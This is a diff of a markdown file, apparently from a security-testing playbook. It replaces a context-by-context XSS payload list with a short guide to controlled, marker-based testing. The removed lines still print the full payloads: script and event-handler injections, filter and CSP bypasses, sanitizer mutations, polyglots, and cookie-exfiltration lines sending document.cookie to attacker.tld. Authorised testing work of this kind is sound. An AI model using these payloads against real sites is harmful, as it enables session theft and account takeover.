@@ -1,148 +1,26 @@
-# PAYLOADS — XSS — By Context
+# Context payload lookup: xss reflected stored dom
 
-> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.
+Canonical guide: [xss_reflected_stored_dom.md](../../web-mode/SKILL_FILES/VULNERABILITIES/WEB/xss_reflected_stored_dom.md).
 
-## 1. XSS — By Context
+This entry point contains selection rules, not a second payload library. Load the
+canonical guide's experiment and payload sections; its controls, preconditions,
+source/version limits and interpretation travel with every example.
 
-### HTML BODY
-```
-<script>alert(document.domain)</script>
-<svg/onload=alert(document.domain)>
-<img src=x onerror=alert(document.domain)>
-<iframe src="javascript:alert(document.domain)">
-<body onload=alert(document.domain)>
-<details open ontoggle=alert(document.domain)>
-<marquee onstart=alert(document.domain)>
-<video><source onerror=alert(document.domain)>
-<audio src onerror=alert(document.domain)>
-<input autofocus onfocus=alert(document.domain)>
-<form><button formaction=javascript:alert(document.domain)>X
-<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src onerror=alert(1)>">
-<object data="data:text/html,<script>alert(document.domain)</script>">
-```
+## Select the experiment
 
-### ATTRIBUTE — DOUBLE QUOTED
-```
-" autofocus onfocus=alert(document.domain) x="
-" onmouseover=alert(document.domain) x="
-"><svg/onload=alert(document.domain)>
-"><script>alert(document.domain)</script>
-```
+- Contexts: HTML / quoted attributes / JavaScript / URL / DOM / sanitizer mutation.
+- Determine parser, transformations, actual executable sink and victim delivery. Select one inert marker/control pair before a context-specific execution proof.
+- Name the input source, decoder/parser and expected security boundary first.
+- Discovery may use a cheap justified probe before any primitive is confirmed.
+- Choose a valid baseline, a minimally changed probe, and a matched negative control.
+- Substitute only owned actor/resource IDs and a unique `AUDIT_MARKER`.
+- Preserve the real parser bytes and any required URL/base64/JSON encoding.
+- Record a denied request as the tested observation; do not certify the whole class.
+- An observed source example is not a vendor-wide working payload or target proof.
 
-### ATTRIBUTE — SINGLE QUOTED
-```
-' autofocus onfocus=alert(document.domain) x='
-'><svg/onload=alert(document.domain)>
-```
+## Return to the owning methodology
 
-### ATTRIBUTE — UNQUOTED
-```
-x onmouseover=alert(document.domain) y=
-x autofocus onfocus=alert(document.domain) y=
-```
-
-### JS STRING — SINGLE QUOTED
-```
-';alert(document.domain);//
-';alert(document.domain);x='
-\\';alert(document.domain);//
-```
-
-### JS STRING — DOUBLE QUOTED
-```
-";alert(document.domain);//
-";alert(document.domain);x="
-```
-
-### JS TEMPLATE LITERAL
-```
-${alert(document.domain)}
-`;alert(document.domain);//
-```
-
-### JSON IN <script>
-```
-"</script><svg/onload=alert(document.domain)>"
-"\u003c/script>\u003csvg/onload=alert(document.domain)>"
-```
-
-### URL / HREF
-```
-javascript:alert(document.domain)
-JaVaScRiPt:alert(document.domain)
-java%0ascript:alert(document.domain)
-data:text/html,<script>alert(document.domain)</script>
-data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
-//evil.tld/x.html
-```
-
-### SVG
-```
-<svg><g/onload=alert(document.domain)></g></svg>
-<svg><script>alert(document.domain)</script></svg>
-<svg><a><animate attributeName=href values=javascript:alert(1) /><text>X</text></a></svg>
-<svg><animate attributeName=href values=javascript:alert(1) /></svg>
-```
-
-### CSS
-```
-<style>@import 'http://evil.tld/x.css';</style>
-<link rel=stylesheet href="http://evil.tld/x.css">
-<style>*{background:url("javascript:alert(1)")}</style>     /* old browsers */
-<style>x{behavior:url('script.htc')}</style>                /* IE only */
-```
-
-### FILTER BYPASS — TAG VARIATIONS
-```
-<sCrIpT>alert(1)</ScRiPt>
-<script >alert(1)</script>
-<script/x>alert(1)</script>
-<script
-x>alert(1)</script>
-<script ~='~'>alert(1)</script>
-<svg/onload=alert(1)>
-<svg onload=alert`1`>
-<script>alert(1)<!--</script>
-```
-
-### EVENT HANDLERS WHEN <script> IS BLOCKED
-```
-onpointerenter onpointerover onauxclick oncontextmenu
-oninput onpointerdown onmouseenter onmouseleave onpointerout
-onfocus onblur onfocusin onfocusout
-ontoggle onbeforetoggle
-onanimationstart onanimationend onanimationiteration
-ontransitionstart ontransitionend
-```
-
-### DOMPURIFY MUTATIONS (HISTORICAL)
-```
-<form><math><mtext></form><form><mglyph><svg><mtext><textarea><a title="</textarea><img src onerror=alert(1)>">
-<noscript><p title="</noscript><img src=x onerror=alert(1)>">
-<svg><style><img src=x onerror=alert(1)></style></svg>
-```
-
-### CSP BYPASSES (CONTEXT-DEPENDENT)
-- AngularJS gadget: `<input ng-app ng-csp ng-init="$on.constructor('alert(1)')()">`
-- JSONP: `<script src=https://allowed.tld/jsonp?cb=alert>`
-- script-src 'self' + uploadable .js: upload `evil.js` with `alert(1)`, then `<script src=/uploads/evil.js>`
-- script-src 'unsafe-eval': `<script>setTimeout('alert(1)')</script>`
-- Base-URI not set + dangling `<script src=//attacker/x.js>` after `<base href=//attacker>`
-
-### POLYGLOTS
-```
-jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
-
-"><svg/onload=alert(document.domain)>'-alert(document.domain)-'
-
-/*</style></script><svg onload=alert(1)>
-```
-
-### EXFIL
-```
-new Image().src='https://attacker.tld/?c='+btoa(document.cookie)
-fetch('https://attacker.tld/',{method:'POST',body:document.cookie})
-navigator.sendBeacon('https://attacker.tld/',document.cookie)
-```
-
----
+If no example fits the observed sink, reason from that sink or current primary
+research rather than loading unrelated variants. If the application rejects the
+probe, discriminate parsing, reachability, authorization and delivery failure
+before either expanding or closing the hypothesis.
